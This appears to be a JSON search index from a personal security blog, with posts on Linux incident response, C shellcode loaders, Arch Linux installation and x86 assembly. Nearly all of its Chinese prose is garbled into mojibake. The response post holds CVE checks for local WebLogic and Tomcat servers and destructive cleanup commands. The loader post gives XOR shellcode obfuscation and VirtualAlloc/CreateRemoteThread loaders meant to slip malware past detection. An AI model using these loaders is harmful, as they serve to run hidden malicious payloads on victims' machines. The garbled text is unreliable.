tomcatæœåŠ¡ï¼&quot; ps aux | grep &quot;tomcat|httpd&quot; | grep -v grep echo &quot;å¼€å§‹æ£€æŸ¥apache tomcaté…ç½®å®‰å…¨&quot; echo &quot;æ£€æŸ¥æ˜¯å¦å­˜åœ¨tomcatå£ä»¤é…ç½®&quot; find / -name tomcat-users.xml | xargs grep -C 3 &quot;username=&quot; echo &quot;æ£€æŸ¥æ˜¯å¦å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´&quot; find / -name web.xml | head -1 | xargs grep &quot;readonly&quot; else echo &quot;æœªå‘ç°å­˜åœ¨apache tomcatæœåŠ¡&quot; fi echo ---------------------------------------------------------- echo &quot;-----------æ£€æŸ¥ç³»ç»Ÿæ˜¯å¦å­˜åœ¨weblogicç›¸å…³å®‰å…¨æ¼æ´---------------------&quot; #è¿˜éœ€çœ‹åç»­æ€ä¹ˆå®Œå–„ if ps aux | grep weblogic | grep -v grep 1&gt;/dev/null 2&gt;&amp;1 ;then echo &quot;å­˜åœ¨weblogicæœåŠ¡ï¼&quot; ps aux | grep weblogic | grep -v grep if netstat -tulnp | egrep &quot;:7001&quot; 1&gt;/dev/null 2&gt;&amp;1; then echo &quot;å¼€å§‹æ£€æŸ¥å¯èƒ½å­˜åœ¨çš„æ¼æ´ï¼&quot;; if wget -q -O - http://127.0.0.1:7001/wls-wsat/CoordinatorPortType | grep &quot;weblogic.wsee.wstx.wsat.v10.endpoint.CoordinatorPortTypePortImpl&quot; 1&gt;/dev/null 2&gt;&amp;1;then echo &quot;å­˜åœ¨CVE-2017-10271æ¼æ´ï¼&quot;; else echo &quot;æœªå‘ç°CVE-2017-10271æ¼æ´ï¼&quot;; fi if ( wget -q -O - http://127.0.0.1:7001/ws_utc/begin.do ) 1&gt;/dev/null 2&gt;&amp;1 || ( wget -q -O - http://127.0.0.1:7001/ws_utc/config.do ) 1&gt;/dev/null 2&gt;&amp;1;then echo &quot;å­˜åœ¨CVE-2018-2894æ¼æ´ï¼&quot;; else echo &quot;æœªå‘ç°CVE-2018-2894æ¼æ´ï¼&quot;; fi if wget -q -O - http://127.0.0.1:7001/_async/AsyncResponseService | grep &quot;AsyncResponseService home page&quot; 1&gt;/dev/null 2&gt;&amp;1;then echo &quot;å­˜åœ¨CNVD-C-2019-48814æ¼æ´ï¼&quot;; else echo &quot;æœªå‘ç°CNVD-C-2019-48814æ¼æ´ï¼&quot;; fi else echo &quot;æœåŠ¡ä¸ºæœ¬åœ°ä½¿ç”¨ï¼Œæ— æ³•è¿œç¨‹è®¿é—®ã€‚&quot;; fi else echo &quot;æœªå‘ç°ä½¿ç”¨weblogicæœåŠ¡&quot;; fi echo ---------------------è¿è¡Œå®Œæ¯•------------------------ æŒ–çŸ¿æœ¨é©¬ æŒ–çŸ¿ç—…æ¯’ä¸€èˆ¬é€šè¿‡æ•æ„Ÿç«¯å£ï¼Œ3306ï¼Œ22ï¼Œ23ç­‰æˆ–åˆ©ç”¨ä¸€äº›ç®€å•æ¼æ´å¦‚weblogicï¼Œjbossååºåˆ—åŒ–ç­‰ï¼ˆå› ä¸ºæŒ–çŸ¿å›¢ä¼™ä¸€èˆ¬è¿½æ±‚æ•°é‡å’Œé€Ÿåº¦ï¼Œæ‰€ä»¥ä¸€èˆ¬ä¸ä¼šé€šè¿‡ä¸€äº›å¤æ‚çš„æ¼æ´å…¥ä¾µï¼‰ èŒä¸šåŒ–çš„æŒ–çŸ¿ä¸€èˆ¬ä¼šé€šè¿‡ä¼ªè£…è¿›ç¨‹ï¼ŒåŠ å£³ï¼Œä»£ç æ··æ·†ï¼Œç§æ­çŸ¿æ± æˆ–ä»£ç†çš„æ‰‹æ®µæ¥è§„é¿å®‰å…¨åˆ†æä¸æº¯æºã€‚æŒ–çŸ¿ç—…æ¯’å¾€å¾€ä¼šé€šè¿‡crontabè®¾ç½®å‘¨æœŸæ€§è¢«æ‰§è¡Œçš„æŒ‡ä»¤æ¥ä¿è¯èƒ½å¤Ÿåœ¨å—å®³ä¸»æœºä¸ŠæŒä¹…åŒ–é©»ç•™ã€‚ æŒ–çŸ¿æ’æŸ¥ æŒ–çŸ¿å¤„ç½®æ€è·¯ï¼šéš”ç¦»ä¸»æœº -&gt;é˜»æ–­å¼‚å¸¸é€šä¿¡-&gt;æ¸…é™¤è®¡åˆ’ä»»åŠ¡-&gt;æ¸…é™¤å¯åŠ¨é¡¹-&gt;æ’æŸ¥æ–‡ä»¶-&gt;æ¸…ç†æœ¨é©¬-&gt;åˆ†ææº¯æºå¤„ç† å¿«é€Ÿå“åº”æ€è·¯ï¼šæŸ¥è¿›ç¨‹-&gt;æ‰¾æŒ–çŸ¿æ–‡ä»¶è·¯å¾„-&gt;åˆ è¿›ç¨‹ï¼Œåˆ æ–‡ä»¶-&gt;æº¯æºæ’æŸ¥ è¿›ç¨‹æ’æŸ¥ top -c #æŸ¥çœ‹cpuå æ¯”æœ€é«˜çš„è¿›ç¨‹pid ps aux | less systemctl status $PID #æ’æŸ¥æœ‰æ— å®ˆæŠ¤è¿›ç¨‹ å¼‚å¸¸è¿æ¥æ’æŸ¥ iptables -L -n netstat -natp | grep $PID è®¡åˆ’ä»»åŠ¡æ’æŸ¥ crontab -l #centos7æœ‰è®°å½• crontab æ—¥å¿— cd /var/log cat cron* | grep RELOAD å¯åŠ¨é¡¹æ’æŸ¥ /usr/lib/systemd/system /usr/lib/systemd/system/multi-user.target.wants /etc/rc.local /etc/inittab /etc/rc0.d/ /etc/rc1.d/ /etc/rc2.d/ /etc/rc3.d/ /etc/rc4.d/ /etc/rc5.d/ /etc/rc6.d/ /etc/rc.d/ è·å–æŒ–çŸ¿æ–‡ä»¶è·¯å¾„ ls -l /proc/$PID/exe è¿›ç¨‹å¤„ç½® kill -9 $PID #åˆ é™¤æŒ–çŸ¿è¿›ç¨‹ ps -ef | grep &quot;$å…³é”®å­—&quot; |awk &quot;{pint $2}&quot; | xargs pkill #åˆ é™¤æŒ–çŸ¿å®¶æ—æ‰€æœ‰è¿›ç¨‹åŠå®ˆæŠ¤è¿›ç¨‹ æ–‡ä»¶å¤„ç½® rm -rf $FILE #åˆ é™¤æŒ–çŸ¿æ–‡ä»¶ find / -name &quot;$FILE*&quot; | xargs rm -rf #å½“æ–‡ä»¶è¢«èµ‹äºˆa i å±æ€§æ— æ³•rmæ—¶ chattr -a -i $FILE rm -rf $FILE 2&gt;/dev/null è®¡åˆ’ä»»åŠ¡æ¸…ç† vi /etc/crontab crontab -e #rootæƒé™æ‰§è¡Œ æ¸…ç†å¯åŠ¨é¡¹ system disable æœåŠ¡åï¼ˆcentOS7ä»¥ä¸Šï¼‰ chkconfig æœåŠ¡å offï¼ˆcentOS7ä»¥ä¸‹ï¼‰ æŒ–çŸ¿å¤„ç†tips å®šæ—¶ä»»åŠ¡æœ‰æ—¶æ‰‹åŠ¨åˆ äº†è¿˜æ˜¯æ²¡ç”¨ï¼Œè¯´æ˜å…¶æœ‰å®ˆæŠ¤è¿›ç¨‹å»ç›‘æ§å®šæ—¶ä»»åŠ¡çš„çŠ¶æ€ å¯ä»¥ç”¨topç›‘æ§å†…å­˜ï¼Œä¸€åˆ æ‰å®šæ—¶ä»»åŠ¡ crontab -r(åˆ é™¤æ‰€æœ‰å®šæ—¶ä»»åŠ¡)ï¼Œtop é‡Œå°±å‘ç°æœ‰è¿›ç¨‹çš„cpuåœ¨è·³åŠ¨ï¼Œé‡ç‚¹æ’æŸ¥è¿™ä¸ªè¿›ç¨‹ æŒ–çŸ¿å›¢ä¼™ä½¿ç”¨çš„æ¶æ„è„šæœ¬å¾€å¾€ç»è¿‡å„ç§æ··æ·†,åœ¨æ¸…ç†æ—¶å¯ä»¥ä¿ç•™æ ·æœ¬ä»¥ä¾›åˆ†æ æŒ–çŸ¿æœ¨é©¬å®¶æ— SMBGhostæŒ–çŸ¿ å…¥ä¾µæ‰‹æ®µ å…¥ä¾µç³»ç»Ÿ windows linux å…¥ä¾µæ–¹å¼ Lnkæ¼æ´cve-2017-8464(ç§»åŠ¨è®¾å¤‡) sshçˆ†ç ´ Hadoop Yarnæœªæˆæƒè®¿é—® RDPçˆ†ç ´ æ°¸æ’ä¹‹è“ms17-010 $IPCçˆ†ç ´ SMBçˆ†ç ´ redisæœªæˆæƒè®¿é—® mssqlçˆ†ç ´ officeæ¼æ´cve-2017-8570(é’“é±¼é‚®ä»¶) SMBGhostæ¼æ´cve-2020-0796 å—æ„ŸæŸ“æ–‡ä»¶ /etc/crontab /var/spool/cron/'whoami' kdevtmpfsiæŒ–çŸ¿ å…¥ä¾µæ‰‹æ®µ windows linux Lnkæ¼æ´cve-2017-8464(ç§»åŠ¨è®¾å¤‡) sshçˆ†ç ´ æ°¸æ’ä¹‹è“ms17-010 RDPçˆ†ç ´ SMBçˆ†ç ´ $IPCçˆ†ç ´ mssqlçˆ†ç ´ redisæœªæˆæƒè®¿é—® Hadoop Yarnæœªæˆæƒè®¿é—® 1 officeæ¼æ´cve-2017-8570(é’“é±¼é‚®ä»¶) SMBGhostæ¼æ´cve-2020-0796 å—æ„ŸæŸ“æ–‡ä»¶ /var/tmp/kinsing /tmp/kdevtmpfsi /var/spool/cron/'whoami' /tmp/dark.x86 /tmp/dark.x86.1 DDG æŒ–çŸ¿ å…¥ä¾µæ‰‹æ®µ å…¥ä¾µæ–¹å¼ Orientdb æ¼æ´ï¼ˆæ—©æœŸï¼‰ Redis æœªæˆæƒè®¿é—®æ¼æ´ SSH å¼±å¯†ç  å—æ„ŸæŸ“æ–‡ä»¶ imWBR1(æŒ–çŸ¿ç¨‹åº) wnTKYg 2t3ik qW3xT 8220 æŒ–çŸ¿ å…¥ä¾µæ‰‹æ®µ å…¥ä¾µæ–¹å¼ WebLogic XMLDecoder ååºåˆ—åŒ–æ¼æ´ Drupal è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ JBoss ååºåˆ—åŒ–å‘½ä»¤æ‰§è¡Œæ¼æ´ Couchdb çš„ç»„åˆæ¼æ´ Redis æœªæˆæƒè®¿é—® Hadoop Yarn æœªæˆæƒè®¿é—®æ¼æ´ å—æ„ŸæŸ“æ–‡ä»¶ wc.conf(é…ç½®æ–‡ä»¶) sutseï¼ˆæŒ–çŸ¿ç¨‹åºï¼‰ Mykings(theHidden)æŒ–çŸ¿ å…¥ä¾µæ‰‹æ®µ å…¥ä¾µæ–¹å¼ 3306 MySQL 135 WMI 22 SSH 445 IPC 23 Telnet 80 Web 3389 RDP å—æ„ŸæŸ“æ–‡ä»¶ msinfo.exe ups.rar(æŒä¹…åŒ–æ–‡ä»¶) lsmose.exe(æŒ–çŸ¿ç¨‹åº) Webæ—¥å¿—åˆ†æ Apacheæ—¥å¿— apacheæ—¥å¿—åˆ†ä¸ºaccess_logå’Œerror_log access_logè®°å½•å¯¹apacheæœåŠ¡å™¨çš„è¯·æ±‚è®¿é—® error_logè®°å½•é”™è¯¯è¯·æ±‚ é»˜è®¤ä½ç½®ï¼š /var/log/apache2 Ngnixæ—¥å¿— ngnixæ—¥å¿—åˆ†ä¸ºaccess.logå’Œerror.log access.logè®°å½•è®¿é—®æ—¥å¿— error.logè®°å½•é”™è¯¯ä¿¡æ¯ é»˜è®¤ä½ç½®ï¼š/var/log/ngnix iisæ—¥å¿— é»˜è®¤ä½ç½®ï¼šC:\\WINDOWS\\system32\\LogFiles Tomcatæ—¥å¿— tomcatæ—¥å¿—åˆ†ä¸ºcatalina.out,localhost,manager,local_access_log catalina.outè®°å½•è¿è¡Œä¸­å¼‚å¸¸é”™è¯¯ç­‰ localhost.Y-M-D.logè®°å½•å†…éƒ¨ä»£ç å¼‚å¸¸æ—¥å¿— manager.Y-M-D.logè®°å½•ç®¡ç†æ—¥å¿— localhost_access_logè®°å½•è®¿é—®æ—¥å¿— é»˜è®¤ä½ç½®ï¼š/tomcat/log weblogicæ—¥å¿— weblogicæ—¥å¿—åˆ†ä¸ºaccess.logï¼ŒServer.logï¼Œdomain.log access.logè®°å½•httpè¯·æ±‚ sever.logè®°å½•å¯åŠ¨ï¼Œå…³é—­ï¼Œéƒ¨ç½²ä¿¡æ¯ domain.logè®°å½•doainçš„è¿è¡Œæƒ…å†µ åˆ†ææŠ€å·§ find / -name &quot;*.log&quot;|xargs grep &quot;webshell&quot; #æŸ¥è¯¢websellä½•æ—¶è¢«ä¸Šä¼ çš„è¿›è¡Œè¿›ä¸€æ­¥æº¯æº å‹’ç´¢æº¯æº ç¡®è®¤å‹’ç´¢ç—…æ¯’ç§ç±» &lt;æ ·æœ¬æœç´¢ç¡®è®¤&gt; https://lesuobingdu.360.cn/ &lt;360å‹’ç´¢ç—…æ¯’æœç´¢å¼•æ“&gt; https://guanjia.qq.com/pr/ls/ &lt;è…¾è®¯å‹’ç´¢ç—…æ¯’æœç´¢å¼•æ“&gt; https://lesuo.venuseye.com.cn/ &lt;VenusEyeå‹’ç´¢ç—…æ¯’æœç´¢å¼•æ“&gt; https://lesuobingdu.qianxin.com/ &lt;qaxå‹’ç´¢ç—…æ¯’çš„æœç´¢å¼•æ“&gt; https://edr.sangfor.com.cn/#/information/ransom_search &lt;sangforå‹’ç´¢ç—…æ¯’æœç´¢å¼•æ“&gt; è§£å¯†å‹’ç´¢æ–‡ä»¶ https://github.com/jiansiting/Decryption-Tools &lt;è§£å¯†è„šæœ¬æŸ¥æ‰¾&gt; åˆ†ææº¯æº æ¶æ„é‚®ä»¶ å‘ä»¶äººåˆ†æ nslookup -type=mx xxx.com #mxè®°å½•æŸ¥è¯¢ ","link":"https://Zer0-hex.github.io/linux-ying-ji-xiang-ying/"},{"title":"Cè¯­è¨€å¸¸è§ShellcodeåŠ è½½å™¨","content":"Pythonç®€å•å®ç°å¯¹Shellcodeçš„XORåŠ å¯† shellcode = &quot;&quot; # \\xfc\\x48\\x83\\xe4...... for i, n in enumerate(shellcode): temp = ord(n) ^ (i % 73) print('0x%.2x, ' % temp, end='') if i % 16 == 15: print() Cè¯­è¨€åŠ è½½ æŒ‡é’ˆè°ƒç”¨ #include&lt;stdio.h&gt; #include&lt;windows.h&gt; unsigned char shellcode[1024] = { // 0xfc, 0x49, 0x81, 0xe7, 0xf4, 0xed...... }; void init() { for (int i=0; i &lt; sizeof(shellcode); i++) { shellcode[i] ^= (i % 73); } } void print_shellcode() { for(int i=0; i &lt; sizeof(shellcode); i++) { printf(&quot;0x%.2x, &quot;, shellcode[i]); if (i % 16 == 15) { printf(&quot;\\n&quot;); } } } int main(void) { init(); print_shellcode(); exec = VirtualAlloc(NULL, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); memcpy(exec, shellcode, sizeof(shellcode)); printf(&quot;[+] exec start...\\n&quot;); (*(void(*)())exec)(); printf(&quot;[-] exec end...\\n&quot;); return 0; } Remote thread Loader #include &lt;windows.h&gt; #include &lt;stdio.h&gt; unsigned char shellcode[1024] = { //0xfc, 0x49, 0x81, 0xe7, 0xf4...... }; void init() { for (int i=0; i &lt; sizeof(shellcode); i++) { shellcode[i] ^= (i % 73); } } void print_shellcode() { for(int i=0; i &lt; sizeof(shellcode); i++) { printf(&quot;0x%.2x, &quot;, shellcode[i]); if (i % 16 == 15) { printf(&quot;\\n&quot;); } } } int main(void) { init(); print_shellcode(); HANDLE hProc = (HANDLE)-1; PVOID pAddress = VirtualAllocEx(hProc, NULL, 1024, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); WriteProcessMemory(hProc, pAddress, shellcode, sizeof(shellcode), NULL); HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, pAddress, NULL, NULL, NULL); printf(&quot;[+] Wait thread...\\n&quot;); WaitForSingleObject(hThread, INFINITE); printf(&quot;[-] Thread exit...\\n&quot;); return 0; } ","link":"https://Zer0-hex.github.io/c-yu-yan-chang-jian-shellcode-jia-zai-qi/"},{"title":"Arch Linux å®‰è£…","content":"Arch Linux installation è¯·é…åˆ Arch Wiki è¿›è¡Œå®‰è£…é…ç½® é•œåƒ åˆ°å„å¤§é•œåƒç«™å‡å¯ä¸‹è½½é•œåƒã€‚æ¸…åå¤§å­¦å¼€æºè½¯ä»¶é•œåƒç«™ ä½¿ç”¨åˆ»å½•å·¥å…·åˆ»å½•è‡³Uç›˜ã€‚Rufusã€dd(Linuxå·¥å…·) è¿›å…¥BIOSç³»ç»Ÿï¼Œå…³é—­å®‰å…¨å¯åŠ¨(Secure Boot) å¯åŠ¨åˆ°Liveç¯å¢ƒ æ£€æŸ¥ç½‘ç»œ æœ‰çº¿ç½‘ç»œæ£€æŸ¥æ˜¯å¦è¿æ¥æˆåŠŸ # ip link # ip addr # ping -c 4 archlinux.org æ— çº¿ç½‘ç»œä½¿ç”¨iwctfé…ç½®wifi # iwctl [iwd]# device list # æ˜¾ç¤ºè®¾å¤‡åˆ—è¡¨ï¼Œæˆ‘çš„è®¾å¤‡åä¸ºwlan0 [iwd]# station wlan0 scan # æ‰«æwifi [iwd]# station wlan0 get-networks # è·å–wifiä¿¡æ¯ [iwd]# station wlan0 connect [wifiåç§°] # è¿æ¥wifi æ›´æ–°æ—¶é—´ # timedatectl set-ntp true æ›´æ¢è½¯ä»¶æº åˆ‡æ¢é•œåƒæº # reflector --country China --age 24 --sort rate --protocol https --save /etc/pacman.d/mirrorlist # pacman -Syy ç£ç›˜åˆ†åŒº æŸ¥çœ‹ç£ç›˜ # lsblk # æŸ¥çœ‹ç£ç›˜åç§° NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINTS nvme0n1 259:0 0 476.9G 0 disk â”œâ”€nvme0n1p1 259:1 0 512M 0 part /boot/efi â”œâ”€nvme0n1p2 259:2 0 10G 0 part [SWAP] â””â”€nvme0n1p3 259:3 0 466.4G 0 part / # gdisk /dev/nvme0n1 # ä½¿ç”¨ç£ç›˜åˆ†åŒºå·¥å…·gdiskå¯¹éœ€è¦å®‰è£…ç³»ç»Ÿçš„ç£ç›˜è¿›è¡Œæ“ä½œ # cfdisk /dev/nvme0n1 # åœ¨å‘½ä»¤è¡Œæœ‰å›¾å½¢ç•Œé¢çš„åˆ†åŒºå·¥å…· å›ºæ€ç¡¬ç›˜ä¸€èˆ¬ä¸ºnvme0n1ã€nvme0n2ï¼Œæœºæ¢°ç¡¬ç›˜ä¸€èˆ¬ä¸ºsdaã€sdbã€‚ åˆ†åŒºæ“ä½œ æŒ‚è½½ç‚¹ å¤§å° ç±»å‹ /boot/efi 512MB å¼•å¯¼åˆ†åŒºï¼ˆvfatï¼‰ swap RAM * 1.1 é€»è¾‘åˆ†åŒºï¼ˆswapï¼‰ / å‰©ä½™ç©ºé—´ ä¸»åˆ†åŒºï¼ˆxfsã€btrfsã€ext4ä¸‰é€‰ä¸€ï¼‰ å…³äºæ–‡ä»¶ç³»ç»Ÿï¼Œä¸å¤ªé è°±çš„è§£é‡Šï¼šxfs(å¤§æ–‡ä»¶å­˜å‚¨æ•ˆç‡é«˜)ã€btrfs(å‹ç¼©å¼å­˜å‚¨)ã€ext4(çœ‹ä¸æ‡‚å°±ç”¨è¿™ä¸ª) æ ¼å¼åŒ–åˆ†åŒº æˆ‘çš„åˆ†åŒºå¦‚ä¸‹ï¼š å¼•å¯¼åˆ†åŒºï¼š/dev/nvme0n1p1 é€»è¾‘åˆ†åŒºï¼š/dev/nvme0n1p2 ä¸»åˆ†åŒºï¼š/dev/nvme0n1p3 # mkfs.vfat /dev/nvme0n1p1 # æ ¼å¼åŒ–å¼•å¯¼åˆ†åŒº # mkfs.ext4(xfs/btrfs) /dev/nvme0n1p3 # æ ¼å¼åŒ–ä¸»åˆ†åŒº # mkswap /dev/nvme0n1p2 # åˆå§‹åŒ–é€»è¾‘åˆ†åŒº æŒ‚è½½åˆ†åŒº # mount /dev/nvme0n1p3 /mnt # æŒ‚è½½ä¸»ç›®å½•åˆ°/mnt # mkdir -p /mnt/boot/efi # ç»™å¼•å¯¼åˆ†åŒºåˆ›å»ºæ–‡ä»¶å¤¹ # mount /dev/nvme0n1p1 /mnt/boot/efi # æŒ‚è½½å¼•å¯¼åˆ†åŒº # swapon /dev/nvme0n1p2 # å¯ç”¨swapåˆ†åŒº å®‰è£…ç³»ç»Ÿ å®‰è£…åŸºæœ¬ç³»ç»Ÿä»¥åŠéƒ¨åˆ†å·¥å…· # pacstrap /mnt base linux linux-firmware linux-headers base-devel neovim bash-completion ç”Ÿæˆæ–‡ä»¶ç³»ç»Ÿè¡¨ # genfstab -U /mnt &gt;&gt; /mnt/etc/fstab # cat /mnt/etc/fstab é…ç½®ç³»ç»Ÿ åˆ©ç”¨arch-chrootè¿›å…¥ç³»ç»Ÿ # arch-chroot /mnt å®‰è£…å¼•å¯¼ã€ç½‘ç»œã€å¹³å°ç›¸å…³è½¯ä»¶åŒ… # pacman -Syy grub efibootmgr efivar networkmanager amd-ucode(è‹±ç‰¹å°”å¤„ç†å™¨ç”¨intel-ucode) å®‰è£…å¼•å¯¼ # grub-install /dev/nvme0n1p1(å¼•å¯¼åˆ†åŒº) # grub-mkconfig -o /boot/grub/grub.cfg å¼€å¯ç½‘ç»œæœåŠ¡ # systemctl enable NetworkManager ä¿®æ”¹rootç”¨æˆ·å¯†ç  # passwd è¿™é‡Œç”±äºå®‰è£…çš„ç¼–è¾‘å™¨æ˜¯neovimï¼Œè€Œåˆå¸¸å¸¸ä½¿ç”¨vimï¼Œæ‰€ä»¥å»ºç«‹ä¸€ä¸ªé“¾æ¥ sudo ln -s /usr/bin/nvim /usr/bin/vim å¸è½½å·²æŒ‚è½½çš„åˆ†åŒº # exité€€å‡ºè‡³liveç³»ç»Ÿ # umount /mnt/boot/efi # umount /mnt # reboot(é‡å¯å¹¶ç§»é™¤å®‰è£…ä»‹è´¨) å®Œå–„ç³»ç»Ÿ è¿æ¥ç½‘ç»œ # nmtui ä¿®æ”¹ä¸»æœºåç­‰ä¿¡æ¯(æ­¤å¤„ä¸»æœºåä¸ºarch) # vim /etc/hostname ------------------- arch # vim /etc/hosts ---------------- 127.0.0.1 localhost ::1 localhost 127.0.0.1 arch.localdomain arch è®¾ç½®æ—¶é—´ # timedatectl set-timezone Asia/Shanghai # è®¾ç½®æ—¶åŒº # timedatectl set-ntp true # è®¾ç½®æ—¶é—´åŒæ­¥ # timedatectl status # æŸ¥çœ‹çŠ¶æ€ é…ç½®bashç¯å¢ƒå˜é‡(ä¿®æ”¹/etc/sk) # # If not running interactively, don't do anything [[ $- != *i* ]] &amp;&amp; return export EDITOR=vim alias ls='ls --color=auto' alias grep='grep --color=auto' alias egrep='egrep --color=auto' alias fgrep='fgrep --color=auto' [ ! -e ~/.dircolors ] &amp;&amp; eval $(dircolors -p &gt; ~/.dircolors) [ -e /bin/dircolors ] &amp;&amp; eval $(dircolors -b ~/.dircolors) PS1='[\\u@\\h \\W]\\$ ' æ·»åŠ æ™®é€šç”¨æˆ·(lun) # useradd -d lun # passwd lun # usermod -aG wheel, users, storage, power, Ip, adm, optical, lun ä¿®æ”¹sudoeræ–‡ä»¶ # vim /etc/sudoers ------------------ %wheel ALL=(ALL) ALL (å–æ¶ˆç¬¬82è¡Œæ³¨é‡Š) é‡å¯reboot æ¡Œé¢ç¯å¢ƒ xorg $ sudo pacman -Syyu $ sudo pacman -S xorg xorg-xinit $ sudo pacman -S [é€‰ä¸€æ¬¾æ¡Œé¢ç¯å¢ƒ] å­—ä½“è®¾ç½®ï¼ˆå–æ¶ˆä¸¤è¡Œçš„æ³¨é‡Šï¼‰ $ sudo vim /etc/locale.gen -------------------------- en_US.UTF-8 UTF-8 zh_CN.UTF-8 UTF-8 -------------------------- $ sudo echo &quot;LANG=en_US.UTF-8&quot; &gt; /etc/locale.conf # è‹±æ–‡ $ sudo echo &quot;LANG=zh_CN.UTF-8&quot; &gt; /etc/locale.conf # ä¸­æ–‡ $ sudo locale-gen # ç”Ÿæˆå­—ä½“ åœ¨vimä¸­æŒ‰ä¸‹/é”®è¿›å…¥æœç´¢æ¨¡å¼ å®‰è£…ä¸€äº›å­—ä½“ è‹±æ–‡ $ sudo pacman -S ttf-dejavu ttf-droid ttf-hack ttf-font-awesome ttf-lato ttf-liberation ttf-linux-libertine ttf-opensans ttf-roboto ttf-roboto-mono ttf-ubuntu-font-family ä¸­æ–‡ç›¸å…³å­—ä½“ $ sudo pacman -S ttf-hannom noto-fonts noto-fonts-extra noto-fonts-emoji noto-fonts-cjk $ sudo pacman -S adobe-source-code-pro-fonts adobe-source-sans-fonts adobe-source-serif-fonts adobe-source-han-sans-cn-fonts adobe-source-han-sans-hk-fonts adobe-source-han-sans-tw-fonts adobe-source-han-serif-cn-fonts $ sudo pacman -S wqy-zenhei wqy-microhei å¼€å¯freetype2å¼•æ“æ¸²æŸ“å­—ä½“ $ sudo vim /etc/profile.d/freetype2.sh -------------------------------------- # Subpixel hinting mode can be chosen by setting the right TrueType ... # Uncomment and configure below # å–æ¶ˆä¸‹é¢è¿™è¡Œæ³¨é‡Š export FREETYPE_PROPERTIES=&quot;truetype:interpreter-version=40&quot; -------------------------------------- å®‰è£…æ˜¾å¡é©±åŠ¨ AMD $ sudo pacman -S xf86-video-amdgpu xf86-video-ati mesa vulkan-radeon Intel $ sudo pacman -S xf86-video-intel mesa vulkan-intel NVIDIA $ sudo pacman -S nvidia nvidia-settings nvidia-utils å£°éŸ³ç›¸å…³è½¯ä»¶åŒ… $ sudo pacman -S alsa-utils pulseaudio pulseaudio-bluetooth cups å®‰è£…ä¸€äº›å·¥å…· $ sudo pacman -S git cmake 7z unzip unrar fakeroot AURæº $ mkdir ~/Github $ cd ~/Github $ git clone https://aur.archlinux.org/paru.git $ cd paru $ makepkg -si parué…ç½® $ sudo vim /etc/paru.conf ------------------------- ... DevelSuffixes = -git -cvs -svn -bzr -darcs -always -hg #AurOnly BottomUp # å–æ¶ˆç¬¬17è¡ŒBottomUpçš„æ³¨é‡Š #RemoveMake ... ------------------------- wps $ paru wps ---------- ... 12 aur/wifite-mod-pixiewps-git 67.cb8a19e-3 [+10 ~0.00] A tool to attack multiple WEP and WPA encrypted networks at the same time mod with Pixie Dust Attack support 11 aur/wps-office-mui-zh-cn 11.1.0.10702-2 [+19 ~1.73] [Installed] Chinese (Simplified) mui package for WPS Office 10 aur/wps-office-mime-cn 11.1.0.10702-2 [+19 ~1.73] Mime files provided by Kingsoft Office (WPS Office) cn version 9 aur/wps-office-cn 11.1.0.10702-2 [+19 ~1.73] [Installed] Kingsoft Office (WPS Office) CN version - an office productivity suite ... ---------- :: Packages to install (eg: 1 2 3, 1-3): :: 9 11 # å®‰è£…9 11 ä¸€ä¸ªæ˜¯wps,ä¸€ä¸ªæ˜¯wpsçš„å­—ä½“ udisk2 udiskie æ˜¯å…³äºUç›˜ç­‰è®¾å¤‡è‡ªåŠ¨æŒ‚è½½çš„è½¯ä»¶ pcmanfm æ˜¯æœ‰å›¾å½¢åŒ–ç•Œé¢çš„æ–‡ä»¶ç®¡ç†å™¨ $ sudo pacman -S udisk2 udiskie pacmanfm ","link":"https://Zer0-hex.github.io/arch-linux-an-zhuang/"},{"title":"X86å¸¸ç”¨æ±‡ç¼–æŒ‡ä»¤é€ŸæŸ¥è¡¨","content":"æ•°æ®ä¼ é€æŒ‡ä»¤ ğŸ™„ é€šç”¨æ•°æ®ä¼ é€æŒ‡ä»¤ MOV æ ¼å¼ï¼šMOV dst,src åŠŸèƒ½ï¼šå°†srcä¼ é€åˆ°dst é™åˆ¶ï¼šæ®µå¯„å­˜å™¨é—´ä¸å¯ç›´æ¥ç›¸äº’ä¼ é€ï¼Œç«‹å³æ•°ä¸èƒ½ç›´æ¥é€æ®µå¯„å­˜å™¨ï¼ŒCS ä¸å¯ä½œä¸ºç›®çš„æ“ä½œæ•°ã€‚ PUSH &amp; POP æ ¼å¼ï¼šPUSH src &amp; POP dst åŠŸèƒ½ï¼šå°† src å‹æ ˆ &amp; å‡ºæ ˆé€å…¥ dst é™åˆ¶ï¼šCS ä¸å¯ä½œç›®çš„æ“ä½œæ•° XCHG æ ¼å¼ï¼šXCHG dst,src å«ä¹‰ï¼šäº¤æ¢ä¸¤è€…ï¼ˆExchangeï¼‰ é™åˆ¶ï¼šæ®µå¯„å­˜å™¨ä¸å¯ä¸ºæ“ä½œæ•°ï¼Œä¹Ÿä¸èƒ½åŒæ—¶ä¸ºå­˜å‚¨å•å…ƒ XLAT æ ¼å¼ï¼šXLAT å«ä¹‰ï¼šè½¬æ¢è¡¨ï¼ˆTable Look-up Translationï¼‰ åŠŸèƒ½ï¼šç”¨ AL å†…å®¹æŸ¥è¡¨ï¼Œç»“æœå­˜å› ALï¼Œè¡¨æ ¼ä½äº DS:BX åœ°å€ç›®æ ‡ä¼ é€æŒ‡ä»¤ LEA æ ¼å¼ï¼šLEA dst,src å«ä¹‰ï¼šå–æœ‰æ•ˆåœ°å€ï¼ˆLoad Effective Addressï¼‰ åŠŸèƒ½ï¼šå–srcåœ°å€åç§»é‡é€dst æ³¨ï¼šæºæ“ä½œæ•°å¿…é¡»æ˜¯å­˜å‚¨å•å…ƒï¼Œç›®çš„æ“ä½œæ•°å¿…é¡»æ˜¯é™¤æ®µå¯„å­˜å™¨ä¹‹å¤–çš„ 16 ä½å¯„å­˜å™¨ã€‚ LDS &amp; LES æ ¼å¼ï¼šLDS dst,src &amp; LES dst,src å«ä¹‰ï¼šå–åŒå­—æŒ‡é’ˆé€åˆ°ç›®çš„å¯„å­˜å™¨å’Œ DS/ES åŠŸèƒ½ï¼šä»æºæ“ä½œæ•°æŒ‡å®šçš„å­˜å‚¨å•å…ƒä¸­å–å‡º 4 